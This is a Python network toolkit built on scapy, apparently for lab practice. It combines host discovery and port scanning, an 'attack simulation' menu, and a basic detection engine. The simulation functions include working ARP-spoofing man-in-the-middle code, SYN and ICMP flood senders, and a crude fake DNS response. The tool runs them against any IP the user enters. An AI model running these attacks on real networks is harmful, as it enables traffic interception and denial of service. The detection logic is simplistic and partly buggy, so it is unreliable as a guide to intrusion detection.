import asyncio
import socket
import ssl
import json
import os
import time
import requests
from collections import defaultdict
from tqdm import tqdm
from scapy.all import sniff, IP, ARP, Ether, srp, traceroute, send, TCP, UDP, Raw

# -----------------------------
# Global State
# -----------------------------
captured_ips = set()
results = {}
ttl_data = {}
mac_data = {}
semaphore = asyncio.Semaphore(2)
port_usage = defaultdict(int)
start_time = None


# -----------------------------
# Reconnaissance Utilities
# -----------------------------
def guess_os(ttl):
    if ttl >= 255:
        return "Router/IoT"
    elif ttl >= 128:
        return "Windows"
    elif ttl >= 64:
        return "Linux/Unix"
    return "Unknown"


def reverse_dns(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "Unknown"


def geoip_lookup(ip):
    try:
        res = requests.get(f"https://ipapi.co/{ip}/json", timeout=5)
        data = res.json()
        return f"{data.get('city')}, {data.get('country_name')}"
    except Exception:
        return "Unknown"


def get_ssl_info(ip):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((ip, 443), timeout=3) as sock:
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                cert = ssock.getpeercert()
                return {
                    "CN": cert.get("subject", [[("", "")]])[0][0][1],
                    "Issuer": cert.get("issuer", [[("", "")]])[0][0][1],
                    "Expiry": cert.get("notAfter"),
                }
    except Exception:
        return {}


async def grab_banner(ip, port):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
        await asyncio.sleep(1)
        banner = await reader.read(1024)
        writer.close()
        await writer.wait_closed()
        return banner.decode(errors="ignore").strip()
    except Exception:
        return "Unknown"


async def scan_port(ip, port, timeout=1):
    try:
        conn = asyncio.open_connection(ip, port)
        reader, writer = await asyncio.wait_for(conn, timeout=timeout)
        writer.close()
        await writer.wait_closed()
        return port
    except Exception:
        return None


async def scan_host_ports(ip, ports):
    open_ports = {}
    tasks = [scan_port(ip, port) for port in ports]

    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Scanning {ip}"):
        port = await f
        if port:
            try:
                service = socket.getservbyport(port)
            except Exception:
                service = "unknown"
            banner = await grab_banner(ip, port)
            open_ports[port] = {"service": service, "banner": banner}
            port_usage[port] += 1
    return open_ports


def run_traceroute(ip):
    try:
        res, _ = traceroute(ip, maxttl=10, verbose=False)
        return [r[1].src for r in res]
    except Exception:
        return []


async def handle_ip(ip, ports):
    async with semaphore:
        print(f"\n[SCAN STARTED] {ip}")
        hostname = reverse_dns(ip)
        guessed_os = guess_os(ttl_data.get(ip, 0))
        mac = mac_data.get(ip, "Unknown")
        geo = geoip_lookup(ip) if not ip.startswith("192.168.") else "Local"
        ssl_info = get_ssl_info(ip) if 443 in ports else {}
        traceroute_path = run_traceroute(ip)
        open_ports = await scan_host_ports(ip, ports)

        results[ip] = {
            "hostname": hostname,
            "guessed_os": guessed_os,
            "mac": mac,
            "geoip": geo,
            "ssl": ssl_info,
            "traceroute": traceroute_path,
            "open_ports": open_ports,
        }

        with open("scan_results.json", "w") as f:
            json.dump(results, f, indent=4)

        print(f"[SCAN COMPLETE] {ip}")


# -----------------------------
# Passive Sniffing Mode
# -----------------------------
def passive_sniff(interface, count, ports):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = set()

    def process_packet(pkt):
        if IP in pkt:
            for ip in [pkt[IP].src, pkt[IP].dst]:
                if ip not in captured_ips:
                    print(f"[NEW IP FOUND] {ip}")
                    captured_ips.add(ip)
                    ttl_data[ip] = pkt[IP].ttl
                    task = asyncio.ensure_future(handle_ip(ip, ports))
                    tasks.add(task)

    sniff(prn=process_packet, iface=interface, filter="ip", store=False, count=count)

    if tasks:
        loop.run_until_complete(asyncio.wait(tasks))


# -----------------------------
# Active ARP Discovery
# -----------------------------
def arp_discovery(interface):
    print(f"[*] Sending ARP requests on {interface}...")
    ip_range = "192.168.1.0/24"
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst=ip_range)
    packet = ether / arp
    ans, _ = srp(packet, timeout=2, iface=interface, verbose=False)

    for _, rcv in ans:
        ip = rcv.psrc
        mac = rcv.hwsrc
        captured_ips.add(ip)
        mac_data[ip] = mac
        ttl_data[ip] = 64


# -----------------------------
# Attack Simulation
# -----------------------------
def simulate_mitm(target_ip, gateway_ip, interface):
    """ARP spoof to place attacker between target and gateway."""
    print(f"[!] Simulating MITM between {target_ip} and {gateway_ip}")
    pkt1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
    pkt2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
    send(pkt1, iface=interface, count=5, inter=1)
    send(pkt2, iface=interface, count=5, inter=1)


def simulate_syn_flood(target_ip, target_port=80, count=100):
    """Send many SYN packets quickly."""
    print(f"[!] Launching SYN flood on {target_ip}:{target_port}")
    pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(pkt, count=count, inter=0.01)


def simulate_icmp_flood(target_ip, count=100):
    """Send many ICMP Echo Requests."""
    print(f"[!] Launching ICMP flood on {target_ip}")
    pkt = IP(dst=target_ip)/Raw(load="X"*600)
    send(pkt, count=count, inter=0.01)


def simulate_dns_tamper(victim_ip, fake_domain="fake.com", fake_ip="1.2.3.4"):
    """Fake DNS response injection (illustrative)."""
    print(f"[!] Sending fake DNS response to {victim_ip}")
    pkt = IP(dst=victim_ip)/UDP(dport=53)/Raw(load=f"DNS:{fake_domain}->{fake_ip}")
    send(pkt, count=3)


# -----------------------------
# Detection Engine
# -----------------------------
def detect_mitm(pkt):
    """Detect duplicate MAC addresses for same IP (ARP spoofing)."""
    if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # ARP reply
        ip = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc
        if ip in mac_data and mac_data[ip] != mac:
            print(f"[ALERT] MITM suspected! {ip} has conflicting MACs: {mac_data[ip]} vs {mac}")
        mac_data[ip] = mac


def detect_syn_flood(pkt):
    """Detect unusual SYN floods (many SYNs, no ACKs)."""
    if pkt.haslayer(TCP) and pkt[TCP].flags == "S":
        src = pkt[IP].src
        port_usage[src] += 1
        if port_usage[src] > 50:  # threshold
            print(f"[ALERT] SYN flood suspected from {src}")


def detect_dns_tamper(pkt):
    """Detect malformed/fake DNS responses."""
    if pkt.haslayer(UDP) and pkt[UDP].sport == 53 and Raw in pkt:
        payload = pkt[Raw].load
        if b"DNS:" in payload:  # our fake injection marker
            print(f"[ALERT] DNS tampering suspected: {payload}")


def start_detection(interface):
    """Run IDS that checks for MITM, SYN flood, DNS tampering."""
    print("[*] Detection engine running... Press Ctrl+C to stop")
    sniff(iface=interface, prn=lambda p: (detect_mitm(p), detect_syn_flood(p), detect_dns_tamper(p)))


# -----------------------------
# Reporting
# -----------------------------
def show_port_trends():
    print("\n[*] Port Activity Trend (most common open ports):")
    for port, count in sorted(port_usage.items(), key=lambda x: x[1], reverse=True):
        print(f"Port {port}: Open on {count} device(s)")


def show_network_map():
    print("\n[*] Network Map (Simplified):")
    for ip, data in results.items():
        print(f"└── {ip} ({data['hostname']}) [{data['mac']}] → {data['guessed_os']}")


# -----------------------------
# Main Entry
# -----------------------------
def main():
    global start_time
    mode = input("Choose mode:\n1. Passive Sniffing\n2. Active ARP Discovery\n3. Simulate Attacks\n4. Run Detection\n> ").strip()
    interface = input("Enter network interface (default=wlan0): ").strip() or "wlan0"
    port_range = input("Enter port range to scan (default=20-1024): ").strip()

    if port_range:
        try:
            start_port, end_port = map(int, port_range.split("-"))
            ports = list(range(start_port, end_port + 1))
        except Exception:
            print("[!] Invalid range. Using default 20–1024.")
            ports = list(range(20, 1025))
    else:
        ports = list(range(20, 1025))

    if os.path.exists("scan_results.json"):
        os.remove("scan_results.json")

    start_time = time.time()

    if mode == "1":
        pkt_count = int(input("Packets to sniff (default=100): ").strip() or "100")
        passive_sniff(interface, pkt_count, ports)

    elif mode == "2":
        arp_discovery(interface)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        tasks = [handle_ip(ip, ports) for ip in captured_ips]
        loop.run_until_complete(asyncio.gather(*tasks))
        show_port_trends()
        show_network_map()

    elif mode == "3":
        print("Attack Options:\n1. MITM (ARP Spoof)\n2. SYN Flood\n3. ICMP Flood\n4. DNS Tampering")
        choice = input("> ").strip()
        target = input("Enter target IP: ").strip()
        if choice == "1":
            gw = input("Enter gateway IP: ").strip()
            simulate_mitm(target, gw, interface)
        elif choice == "2":
            simulate_syn_flood(target)
        elif choice == "3":
            simulate_icmp_flood(target)
        elif choice == "4":
            simulate_dns_tamper(target)

    elif mode == "4":
        start_detection(interface)

    else:
        print("[!] Invalid mode selected.")

    elapsed = round(time.time() - start_time, 2)
    print(f"\n[*] Duration: {elapsed} seconds")
    print("[*] Results saved to scan_results.json")


if __name__ == "__main__":
    main()
